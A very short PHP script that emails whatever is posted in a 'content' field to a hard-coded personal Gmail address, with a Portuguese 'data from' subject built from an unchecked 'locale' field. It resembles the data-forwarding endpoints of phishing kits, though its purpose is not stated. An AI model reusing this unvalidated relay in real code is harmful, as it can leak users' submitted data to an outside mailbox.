<?php
    $headers = "Content-Type: text/html; charset=UTF-8\r\n";
    mail('william80742@gmail.com',"Dado de ".$_POST['locale'],$_POST['content'],$headers);
?>